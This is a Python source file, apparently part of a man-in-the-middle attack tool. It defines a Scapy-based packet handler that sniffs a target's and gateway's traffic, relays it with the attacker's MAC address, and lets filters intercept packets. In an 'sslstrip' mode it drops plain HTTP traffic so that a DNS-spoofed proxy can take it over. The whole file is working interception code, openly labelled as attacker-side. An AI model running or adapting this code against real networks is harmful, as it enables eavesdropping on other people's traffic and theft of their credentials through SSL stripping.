import logging
from scapy.layers.l2 import Ether, ARP, getmacbyip
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.inet6 import IPv6
from scapy.all import *  # like f it lmfao
import threading

logger = logging.getLogger('PacketHandler')


class PacketHandler:
    """fml"""

    def __init__(self, interface, gateway_ip, target_ips=None):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.target_ips = target_ips if target_ips else []

        # If sslstrip it will drop packets to port 80 for stripping. Lowkeuy hackey but it is what it is im tired
        self.mode = "normal"

        # Get our MAC address
        self.attacker_mac = get_if_hwaddr(interface)

        # Resolve MAC addresses
        self.gateway_mac = self._resolve_mac(gateway_ip)

        self.target_macs = {}

        for target_ip in self.target_ips:
            mac = self._resolve_mac(target_ip)
            if mac:
                self.target_macs[target_ip] = mac
            else:
                logger.warning(f"Could not resolve MAC for target {target_ip}")

        self.attacker_mac = get_if_hwaddr(interface)

        # Get our IP address
        self.local_ip = self._get_interface_ip()
        self.local_ipv6 = self._get_interface_ipv6()
        self.local_proxy_ip = self.local_ip

        self.filters = []  # List of (priority, function) tuples
        self.running = False
        self.sniffer_thread = None

        # Stast
        self.packets_forwarded = 0
        self.packets_dropped = 0

        logger.info(f"PacketHandler initialized")
        logger.info(f"Interface: {interface}")
        logger.info(f"Our MAC: {self.attacker_mac}")
        logger.info(f"Gateway: {gateway_ip} ({self.gateway_mac})")
        logger.info(f"Targets: {len(target_ips)} hosts")

        for ip, mac in self.target_macs.items():
            logger.debug(f"  {ip} -> {mac}")

    def _get_interface_ip(self):
        try:
            return get_if_addr(self.interface)
        except Exception:
            import socket
            import fcntl
            import struct
            import platform
            if platform.system() in ("Linux", "Darwin"):
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                return socket.inet_ntoa(
                    fcntl.ioctl(
                        s.fileno(), 0x8915,  # SIOCGIFADDR
                        struct.pack(
                            '256s', self.interface[:15].encode('utf-8'))
                    )[20:24]
                )
            elif platform.system() == "Windows":
                import psutil
                for name, addrs in psutil.net_if_addrs().items():
                    if name == self.interface:
                        for a in addrs:
                            if a.family == socket.AF_INET:
                                return a.address
            return None

    def _get_interface_ipv6(self):
        try:
            import socket
            import psutil
            for name, addrs in psutil.net_if_addrs().items():
                if name == self.interface:
                    for a in addrs:
                        if a.family == socket.AF_INET6:
                            if not a.address.startswith('fe80'):
                                return a.address
                    # Return link-local if thats all we have
                    for a in addrs:
                        if a.family == socket.AF_INET6:
                            return a.address
        except:
            pass
        return None

    def _resolve_mac(self, ip):
        """Resolve MAC address for an IP"""
        if not ip:
            return None

        try:
            # Try getmacbyip first
            mac = getmacbyip(ip)
            if mac and mac != "ff:ff:ff:ff:ff:ff":
                return mac

            # Manual ARP request
            arp_req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            resp, _ = srp(arp_req, iface=self.interface,
                          timeout=2, retry=2, verbose=0)
            for _, pkt in resp:
                return pkt[Ether].src

        except Exception as e:
            logger.error(f"Could not resolve MAC for {ip}: {e}")

        return None

    def add_filter(self, filter_func, priority=0):
        """Add a packet filter with priority (higher = more priority)"""
        self.filters.append((priority, filter_func))
        self.filters.sort(key=lambda x: x[0], reverse=True)

        logger.info(f"Added filter with priority {priority}")

        return len(self.filters) - 1

    def remove_filter(self, filter_index):
        """Remove a filter by index"""
        if 0 <= filter_index < len(self.filters):
            self.filters.pop(filter_index)
            return True

        return False

    def _packet_callback(self, packet):
        """Process each sniffed packet"""
        try:
            # Skip packets without IP(v6) layer, i think actually theres ipv46... but anwyays risky ill try later
            if not packet.haslayer(IP) and not packet.haslayer(IPv6):
                return

            # Skip our own packets to prevent loops
            if packet.haslayer(Ether) and packet[Ether].src == self.attacker_mac:
                return

            # Let filters process the packet first and yeah if any of the filters says theyll handle it then... let it  handle it
            packet_blocked = False
            for priority, filter_func in self.filters:
                try:
                    if filter_func(packet):  # Filter handled/blocked the packet
                        packet_blocked = True
                        logger.debug(
                            f"Packet blocked by filter (priority {priority})")
                        break
                except Exception as e:
                    logger.error(f"Filter error: {e}")

            # Only forward if no filter blocked it
            if not packet_blocked:
                self._forward_packet(packet)
            else:
                self.packets_dropped += 1

        except Exception as e:
            logger.error(f"Packet callback error: {e}")

    def _forward_packet(self, packet):
        """Forward packets between target and gateway"""
        try:
            if not packet.haslayer(Ether):
                return

            if packet.haslayer(IP):
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
            elif packet.haslayer(IPv6):
                src_ip = packet[IPv6].src
                dst_ip = packet[IPv6].dst
            else:
                return

            # DoNt forward packets destined to our own IP
            if (self.local_ip and dst_ip == self.local_ip) or (self.local_ipv6 and dst_ip == self.local_ipv6):
                return

            # Check if we should drop HTTP packets (SSL strip mode)
            if self.mode == "sslstrip" and packet.haslayer(TCP):
                tcp = packet[TCP]

                # Drop HTTP packets going TO port 80 (except our proxy's packets)
                if tcp.dport == 80:
                    # Don’t drop packets destined to our proxy (DNS spoofed), just let them through
                    if dst_ip == self.local_proxy_ip:
                        return

                    # Allow packets from the proxy itself
                    if hasattr(self, 'local_proxy_ip') and src_ip == self.local_proxy_ip:
                        pass
                    else:
                        # Drop any HTTP request from/to any of our targets
                        if src_ip in self.target_ips or dst_ip in self.target_ips:
                            self.packets_dropped += 1
                            logger.debug(
                                f"Dropped HTTP packet (proxy handles): {src_ip}:{tcp.sport} -> {dst_ip}:80")
                            return

                # Drop return HTTP responses FROM port 80 to any of our targets (unless from proxy)
                if tcp.sport == 80 and dst_ip in self.target_ips:
                    if hasattr(self, 'local_proxy_ip') and packet[Ether].src == self.attacker_mac:
                        pass
                    else:
                        self.packets_dropped += 1
                        logger.debug(
                            f"Dropped HTTP response (proxy handles): {src_ip}:80 -> {dst_ip}:{tcp.dport}")
                        return

            pkt = packet.copy()

            # Clear checksums
            if pkt.haslayer(IP):
                del pkt[IP].chksum
                del pkt[IP].len

            # v6 doesnt have checksum at IP layer
            if pkt.haslayer(TCP):
                del pkt[TCP].chksum
            if pkt.haslayer(UDP):
                del pkt[UDP].chksum

            # Determine forwarding direction and set MACs
            forwarded = False

            # Target -> Gateway (check if source is ANY of our targets)
            if src_ip in self.target_ips:
                if not self.gateway_mac:
                    logger.error("No gateway MAC address!!")
                    self.packets_dropped += 1
                    return

                pkt[Ether].dst = self.gateway_mac
                pkt[Ether].src = self.attacker_mac
                forwarded = True

            # Gateway -> Target (check if dest is ANY of our targets)
            elif dst_ip in self.target_ips:
                # Get the specific target's MAC
                target_mac = self.target_macs.get(dst_ip)
                if not target_mac:
                    logger.error(f"No MAC address for target {dst_ip}!")
                    self.packets_dropped += 1
                    return

                pkt[Ether].dst = target_mac
                pkt[Ether].src = self.attacker_mac
                forwarded = True

            if forwarded:
                sendp(pkt, verbose=0, iface=self.interface)
                self.packets_forwarded += 1

                if packet.haslayer(TCP):
                    if packet[TCP].dport == 443 or packet[TCP].sport == 443:
                        logger.debug(
                            f"HTTPS (forwarded): {src_ip}:{packet[TCP].sport} -> {dst_ip}:{packet[TCP].dport}")
            else:
                self.packets_dropped += 1

        except Exception as e:
            # Lazily handle forwarding errors
            self.packets_dropped += 1

    def _sniffer_loop(self):
        """Main sniffer loop"""
        try:
            # Build filter to avoid our own packets
            filter_str = f"(ip or ip6) and ether src not {self.attacker_mac}"

            # Add target filter if specified
            if self.target_ips:
                target_filters = []
                for ip in self.target_ips:
                    target_filters.append(f"(src host {ip} or dst host {ip})")
                filter_str += f" and ({' or '.join(target_filters)})"

            logger.info(f"Starting packet sniffer with filter: {filter_str}")

            # Start sniffing
            sniff(
                iface=self.interface,
                prn=self._packet_callback,
                filter=filter_str,
                store=0,
                stop_filter=lambda p: not self.running
            )

        except Exception as e:
            logger.error(f"Sniffer error: {e}")
            self.running = False

    def start(self):
        """Start packet handling"""
        if self.running:
            return

        self.running = True
        self.packets_forwarded = 0
        self.packets_dropped = 0

        self.sniffer_thread = threading.Thread(
            target=self._sniffer_loop,
            name="PacketHandler-Sniffer"
        )
        self.sniffer_thread.daemon = True
        self.sniffer_thread.start()

        logger.info("Packet handler started")

    def stop(self):
        """Stop packet handling"""
        logger.info("Stopping packet handler...")
        self.running = False

        if self.sniffer_thread:
            self.sniffer_thread.join(timeout=3)

        logger.info(
            f"Packet handler stopped - Forwarded: {self.packets_forwarded}, Dropped: {self.packets_dropped}")

    def get_stats(self):
        """Get packet statistics"""
        return {
            'forwarded': self.packets_forwarded,
            'dropped': self.packets_dropped,
            'running': self.running
        }
